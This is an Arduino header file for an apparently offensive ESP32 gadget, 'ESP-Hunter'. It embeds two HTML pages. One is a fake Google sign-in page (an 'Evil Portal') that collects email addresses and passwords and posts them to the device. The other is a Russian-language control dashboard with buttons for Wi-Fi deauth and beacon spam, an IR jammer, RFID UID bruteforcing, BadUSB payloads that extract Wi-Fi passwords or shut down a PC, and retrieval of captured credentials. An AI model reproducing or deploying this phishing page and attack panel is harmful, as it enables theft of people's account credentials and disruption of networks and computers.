#ifndef WEBPAGES_H
#define WEBPAGES_H

#include <Arduino.h>

// ======================================================================
// СТРАНИЦА ДЛЯ EVIL PORTAL (фишинговая страница Google)
// ======================================================================
const char EVIL_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Вход — Аккаунт Google</title>
<style>body{font-family:sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:90vh}.card{max-width:400px;padding:40px;border:1px solid #dadce0;border-radius:8px;text-align:center}.logo{font-size:24px;font-weight:500;margin-bottom:24px}.logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}h2{font-size:24px;font-weight:400;color:#202124}p{color:#5f6368}input{width:100%;padding:14px;margin:8px 0 20px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}input:focus{border-color:#1a73e8;border-width:2px}button{background:#1a73e8;color:#fff;border:none;padding:12px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;float:right}button:hover{background:#1557b0}.step{display:none}.step.active{display:block}</style>
<script>let currentStep=1;function nextStep(e){e.preventDefault();let email=document.getElementById('email').value;if(!email)return;document.getElementById('step-1').classList.remove('active');document.getElementById('step-2').classList.add('active');document.getElementById('disp-email').innerText=email;document.getElementById('hidden-email').value=email;currentStep=2;}</script></head>
<body><div class="card"><div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<form id="step-1" class="step active" onsubmit="nextStep(event)"><h2>Вход</h2><p>Используйте аккаунт Google</p><input type="text" id="email" placeholder="Телефон или адрес эл. почты" required><button type="submit">Далее</button></form>
<form id="step-2" class="step" action="/login" method="POST"><h2>Добро пожаловать</h2><p id="disp-email" style="font-weight:500;color:#202124;margin-bottom:20px;"></p><input type="hidden" name="user" id="hidden-email"><input type="password" name="pass" placeholder="Введите пароль" required><button type="submit">Далее</button></form>
</div></body></html>
)rawliteral";

// ======================================================================
// ОБНОВЛЕННЫЙ ВЕБ-ДАШБОРД В СТИЛЕ DARK CYBERPUNK (все функции)
// ======================================================================
const char HTML_DASHBOARD[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP-Hunter Remote Terminal</title>
    <style>
        :root {
            --bg-color: #050806;
            --card-bg: rgba(10, 18, 12, 0.7);
            --accent: #00ff66;
            --accent-glow: rgba(0, 255, 102, 0.25);
            --text: #e0f2e6;
            --text-dim: #7aa387;
            --border: #183822;
            --danger: #ff4d4d;
            --font-mono: 'Fira Code', 'Consolas', 'Courier New', monospace;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-mono); }
        body { background-color: var(--bg-color); color: var(--text); padding-bottom: 40px; }
        .scanline {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            background: linear-gradient(rgba(0, 255, 102, 0.02) 50%, rgba(0, 0, 0, 0.25) 50%);
            background-size: 100% 4px; z-index: 99; opacity: 0.6;
        }
        .scanline.disabled { display: none; }
        header {
            background: rgba(5, 8, 6, 0.9);
            border-bottom: 1px solid var(--border);
            padding: 12px 20px;
            display: flex; justify-content: space-between; align-items: center;
            position: sticky; top: 0; z-index: 10; backdrop-filter: blur(8px);
        }
        .logo { color: var(--accent); font-weight: bold; font-size: 1.1rem; border: 1px solid var(--accent); padding: 4px 10px; background: #000; }
        .container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
        .tabs { display: flex; gap: 6px; overflow-x: auto; margin-bottom: 20px; padding-bottom: 5px; flex-wrap: wrap; }
        .tab-btn {
            background: #000; border: 1px solid var(--border); color: var(--text-dim);
            padding: 8px 14px; font-weight: bold; font-size: 0.8rem; cursor: pointer;
            white-space: nowrap; transition: all 0.2s;
        }
        .tab-btn:hover, .tab-btn.active { color: var(--accent); border-color: var(--accent); background: rgba(0,255,102,0.08); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .card {
            background: var(--card-bg); border: 1px solid var(--border); border-radius: 6px;
            padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px);
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .card h3 { color: var(--accent); font-size: 1rem; margin-bottom: 12px; border-bottom: 1px solid var(--border); padding-bottom: 6px; text-transform: uppercase; }
        .btn {
            background: rgba(0,255,102,0.08); border: 1px solid var(--accent); color: var(--accent);
            padding: 10px 16px; font-weight: bold; font-size: 0.85rem; cursor: pointer;
            width: 100%; margin-top: 6px; transition: all 0.2s; text-transform: uppercase;
        }
        .btn:hover { background: var(--accent); color: #000; }
        .btn-sec { background: #000; border-color: var(--border); color: var(--text-dim); }
        .btn-sec:hover { border-color: var(--accent); color: var(--accent); }
        .btn-danger { border-color: var(--danger); color: var(--danger); }
        .btn-danger:hover { background: var(--danger); color: #000; }
        .status-box { background: #000; border: 1px solid var(--border); padding: 10px; font-size: 0.8rem; color: var(--accent); margin-top: 10px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .mouse-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; max-width: 240px; margin: 15px auto; }
        .mouse-grid button { padding: 12px; font-size: 1.1rem; }
        input, select {
            width: 100%; background: #000; border: 1px solid var(--border); color: #fff;
            padding: 8px 12px; font-size: 0.85rem; margin-bottom: 10px; outline: none;
        }
        input:focus, select:focus { border-color: var(--accent); }
        .inline-flex { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
        .inline-flex .btn { width: auto; flex: 1; }
        hr { border: 0; border-top: 1px solid var(--border); margin: 15px 0; }
    </style>
</head>
<body>
    <div class="scanline" id="scanline"></div>
    <header>
        <div class="logo">&gt;_ ESP-HUNTER // REMOTE</div>
        <button class="btn-sec" style="width:auto; padding:4px 10px;" onclick="toggleFX()">CRT FX</button>
    </header>

    <div class="container">
        <div class="tabs">
            <button class="tab-btn active" onclick="openTab(event, 'display')">🖥 Дисплей</button>
            <button class="tab-btn" onclick="openTab(event, 'pong')">🏓 Pong</button>
            <button class="tab-btn" onclick="openTab(event, 'ir')">📺 IR</button>
            <button class="tab-btn" onclick="openTab(event, 'rfid')">🎴 RFID</button>
            <button class="tab-btn" onclick="openTab(event, 'wifi')">🌐 Wi-Fi</button>
            <button class="tab-btn" onclick="openTab(event, 'sd')">💾 SD</button>
            <button class="tab-btn" onclick="openTab(event, 'about')">ℹ️ About</button>
            <button class="tab-btn" onclick="openTab(event, 'badusb')">⌨️ BadUSB</button>
            <button class="tab-btn" onclick="openTab(event, 'evil')">🚨 Evil Portal</button>
            <button class="tab-btn" onclick="openTab(event, 'web')">🌍 Web Remote</button>
            <button class="tab-btn" onclick="openTab(event, 'mouse')">🐭 Mouse</button>
            <button class="tab-btn" onclick="openTab(event, 'system')">⚙️ System</button>
        </div>

        <!-- DISPLAY -->
        <div id="display" class="tab-content active">
            <div class="card">
                <h3>🖥 Настройки дисплея ST7735</h3>
                <label>Поворот экрана (0-3):</label>
                <select id="disp-rotation" onchange="setRotation()">
                    <option value="0">0° (Портрет)</option>
                    <option value="1">90° (Альбом)</option>
                    <option value="2">180° (Инверсия)</option>
                    <option value="3">270° (Альбом инв.)</option>
                </select>
                <label>Яркость подсветки:</label>
                <input type="range" id="disp-bright" min="0" max="255" value="128" style="width:100%; margin:10px 0;" onchange="setBrightness()">
                <div class="status-box" id="disp-status">Статус: Готов</div>
            </div>
        </div>

        <!-- PONG -->
        <div id="pong" class="tab-content">
            <div class="card">
                <h3>🏓 Управление игрой Pong</h3>
                <button class="btn" onclick="api('/api/pong/up')">▲ Вверх</button>
                <button class="btn" onclick="api('/api/pong/down')">▼ Вниз</button>
                <button class="btn btn-sec" onclick="api('/api/pong/reset')">🔄 Сброс</button>
                <div class="status-box" id="pong-log">Управление с веб-интерфейса</div>
            </div>
        </div>

        <!-- IR -->
        <div id="ir" class="tab-content">
            <div class="card">
                <h3>📺 ИК-приёмник / передатчик</h3>
                <button class="btn" onclick="getIR()">📥 Получить сигнал</button>
                <button class="btn btn-danger" onclick="api('/api/ir/tvbgone')">⚡ TV-B-GONE</button>
                <button class="btn btn-danger" onclick="api('/api/ir/jammer/start')">📡 Jammer Вкл</button>
                <button class="btn btn-sec" onclick="api('/api/ir/jammer/stop')">🛑 Jammer Выкл</button>
                <div class="status-box" id="ir-log">IR RAM: Пусто</div>
            </div>
        </div>

        <!-- RFID -->
        <div id="rfid" class="tab-content">
            <div class="card">
                <h3>🎴 RFID PN532</h3>
                <button class="btn" onclick="readRFID()">🔍 Считать UID</button>
                <button class="btn btn-sec" onclick="api('/api/rfid/emulate')">📡 Эмулировать UID</button>
                <button class="btn btn-sec" onclick="api('/api/rfid/erase')">🗑 Стереть блок 4</button>
                <button class="btn btn-danger" onclick="api('/api/rfid/bruteforce/start')">💥 Bruteforce UID</button>
                <div class="status-box" id="rfid-log">UID: None</div>
            </div>
        </div>

        <!-- Wi-Fi -->
        <div id="wifi" class="tab-content">
            <div class="card">
                <h3>🌐 Wi-Fi диагностика и атаки</h3>
                <button class="btn" onclick="scanWifi()">🔍 Сканировать</button>
                <button class="btn btn-sec" onclick="api('/api/wifi/wardrive')">💾 Wardrive на SD</button>
                <hr>
                <button class="btn btn-danger" onclick="api('/api/wifi/beacon/start')">📡 Beacon Spam</button>
                <button class="btn btn-sec" onclick="api('/api/wifi/beacon/stop')">🛑 Остановить</button>
                <button class="btn btn-danger" onclick="api('/api/wifi/deauth/start')">🔨 Deauth</button>
                <button class="btn btn-sec" onclick="api('/api/wifi/deauth/stop')">🛑 Остановить</button>
                <div class="status-box" id="wifi-log">Ожидание сканирования...</div>
            </div>
        </div>

        <!-- SD -->
        <div id="sd" class="tab-content">
            <div class="card">
                <h3>💾 MicroSD карта</h3>
                <button class="btn" onclick="api('/api/sd/info')">📂 Информация</button>
                <button class="btn btn-sec" onclick="api('/api/sd/list')">📋 Список файлов</button>
                <div class="status-box" id="sd-log">Ожидание...</div>
            </div>
        </div>

        <!-- ABOUT -->
        <div id="about" class="tab-content">
            <div class="card">
                <h3>ℹ️ О системе</h3>
                <button class="btn" onclick="api('/api/about')">🔄 Показать</button>
                <div class="status-box" id="about-log">ESP32-S3 | ST7735 | PN532 | IR | SD</div>
            </div>
        </div>

        <!-- BADUSB -->
        <div id="badusb" class="tab-content">
            <div class="card">
                <h3>⌨️ USB HID (BadUSB)</h3>
                <button class="btn" onclick="api('/api/hid/notepad')">📝 Notepad Demo</button>
                <button class="btn btn-sec" onclick="api('/api/hid/payload')">💾 /payload.txt</button>
                <hr>
                <button class="btn btn-danger" onclick="api('/api/badusb/shutdown')">⏻ Выключить ПК</button>
                <button class="btn" onclick="api('/api/badusb/wallpaper')">🖼️ Сменить обои</button>
                <button class="btn btn-danger" onclick="api('/api/badusb/disableicons')">🗑️ Отключить иконки</button>
                <button class="btn btn-danger" onclick="api('/api/badusb/dumpwifi')">📶 Слить Wi-Fi</button>
                <div class="status-box" id="badusb-log">Готов</div>
            </div>
        </div>

        <!-- EVIL PORTAL -->
        <div id="evil" class="tab-content">
            <div class="card">
                <h3>🚨 Evil Portal (Captive Portal)</h3>
                <button class="btn btn-danger" onclick="api('/api/portal/start')">🚀 Запустить</button>
                <button class="btn btn-sec" onclick="api('/api/portal/stop')">🛑 Остановить</button>
                <button class="btn" onclick="api('/api/portal/creds')">📥 Получить учётные</button>
                <button class="btn btn-sec" onclick="api('/api/portal/creds/list')">📋 Список</button>
                <div class="status-box" id="evil-log">Статус: Остановлен</div>
            </div>
        </div>

        <!-- WEB REMOTE -->
        <div id="web" class="tab-content">
            <div class="card">
                <h3>🌍 Управление через веб (эта же страница)</h3>
                <button class="btn" onclick="api('/api/web/status')">📡 Статус</button>
                <div class="status-box" id="web-log">Web Remote активен</div>
            </div>
        </div>

        <!-- MOUSE -->
        <div id="mouse" class="tab-content">
            <div class="card">
                <h3>🐭 Управление мышью (USB HID)</h3>
                <div class="mouse-grid">
                    <div></div><button class="btn" onclick="mouseMove(0,-20)">▲</button><div></div>
                    <button class="btn" onclick="mouseMove(-20,0)">◄</button>
                    <button class="btn btn-sec" onclick="mouseClick(2)">СК</button>
                    <button class="btn" onclick="mouseMove(20,0)">►</button>
                    <div></div><button class="btn" onclick="mouseMove(0,20)">▼</button><div></div>
                </div>
                <div class="grid-2">
                    <button class="btn" onclick="mouseClick(1)">ЛКМ</button>
                    <button class="btn" onclick="mouseClick(3)">ПКМ</button>
                </div>
                <div class="status-box" id="mouse-log">Мышь готова</div>
            </div>
        </div>

        <!-- SYSTEM -->
        <div id="system" class="tab-content">
            <div class="card">
    <h3>⚙️ Системная информация</h3>
    <button class="btn" onclick="getSystemInfo()">🔄 Обновить</button>
    <div class="status-box" id="sys-log">Загрузка...</div>
    <hr>
    <h3>🔊 Зуммер</h3>
    <button class="btn" onclick="toggleBuzzer()">Вкл/Выкл Зуммер</button>
    <div class="status-box" id="buzzer-log">Статус: ...</div>
</div>
        </div>
    </div>

    <script>
        function toggleFX() { document.getElementById('scanline').classList.toggle('disabled'); }

        function openTab(evt, tabName) {
            let i, content, btn;
            content = document.getElementsByClassName("tab-content");
            for (i = 0; i < content.length; i++) content[i].classList.remove("active");
            btn = document.getElementsByClassName("tab-btn");
            for (i = 0; i < btn.length; i++) btn[i].classList.remove("active");
            document.getElementById(tabName).classList.add("active");
            evt.currentTarget.classList.add("active");
        }

        function api(url, callback) {
            fetch(url).then(r => r.json()).then(data => {
                if (callback) callback(data);
            }).catch(e => console.error("API Error:", e));
        }

        // DISPLAY
        function setRotation() {
            let val = document.getElementById('disp-rotation').value;
            api('/api/display/rotation?val=' + val, d => {
                document.getElementById('disp-status').innerText = d.msg;
            });
        }
        function setBrightness() {
            let val = document.getElementById('disp-bright').value;
            api('/api/display/brightness?val=' + val, d => {
                document.getElementById('disp-status').innerText = d.msg;
            });
        }

        // WIFI
        function scanWifi() {
            document.getElementById('wifi-log').innerText = "Сканирование...";
            api('/api/wifi/scan', data => {
                let txt = "Найденные сети:\n";
                data.forEach(n => { txt += `${n.ssid} | RSSI: ${n.rssi}dBm | Ch: ${n.ch}\n`; });
                document.getElementById('wifi-log').innerText = txt;
            });
        }

        // BLE (вызывается из другой вкладки, но можно добавить)
        function scanBLE() {
            document.getElementById('ble-log').innerText = "Сканирование BLE...";
            api('/api/ble/scan', data => {
                let txt = "BLE Устройства:\n";
                data.forEach(d => { txt += `${d.name || '[Hidden]'} | MAC: ${d.mac} | RSSI: ${d.rssi}\n`; });
                document.getElementById('ble-log').innerText = txt;
            });
        }

        // RFID
        function readRFID() {
            api('/api/rfid/scan', d => {
                document.getElementById('rfid-log').innerText = d.msg + "\nUID: " + d.uid;
            });
        }

        // IR
        function getIR() {
            api('/api/ir/get', d => {
                document.getElementById('ir-log').innerText = d.ir;
            });
        }

        // MOUSE
        function mouseMove(x, y) { api(`/api/mouse/move?x=${x}&y=${y}`); }
        function mouseClick(b) { api(`/api/mouse/click?button=${b}`); }

        // SYSTEM
        function getSystemInfo() {
            api('/api/system/info', d => {
                document.getElementById('sys-log').innerText =
                    `Плата: ${d.board}\nSD Card: ${d.sd}\nHeap: ${d.heap} bytes\nRFID: ${d.rfid}\nIR: ${d.ir}`;
            });
        }
        //Bluzzer
        function toggleBuzzer() {
    fetch('/api/system/buzzer?val=' + (currentBuzzer ? '0' : '1'))
        .then(r => r.json()).then(d => {
            currentBuzzer = d.buzzer;
            document.getElementById('buzzer-log').innerText = 'Статус: ' + (currentBuzzer ? 'ВКЛ' : 'ВЫКЛ');
        });
}
let currentBuzzer = true; // Инициализировать с реальным значением, можно запросить при загрузке

        // Дополнительные: для BLE и других вкладок добавим обработчики
        window.scanBLE = scanBLE;
    </script>
</body>
</html>
)rawliteral";

#endif // WEBPAGES_H